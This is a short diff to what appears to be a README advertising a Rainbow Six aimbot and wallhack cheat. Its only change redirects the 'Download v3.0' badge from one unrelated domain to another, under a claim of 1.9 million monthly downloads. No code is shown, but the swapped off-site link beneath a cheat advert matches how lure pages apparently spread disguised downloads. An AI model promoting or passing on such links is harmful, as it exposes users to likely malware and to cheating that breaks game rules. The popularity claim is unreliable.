@@ -49,7 +49,7 @@ A: Yes — see cameras, traps, and gadgets through walls.
 
 **Monthly downloads:** 1.9m+
 
-[![Download](https://img.shields.io/badge/Download-v3.0-brightgreen?style=for-the-badge)](https://forumconnect.uk/r6aimbot26)
+[![Download](https://img.shields.io/badge/Download-v3.0-brightgreen?style=for-the-badge)](https://connectinstruction.com/r6aimbot26)
 
 ---
 
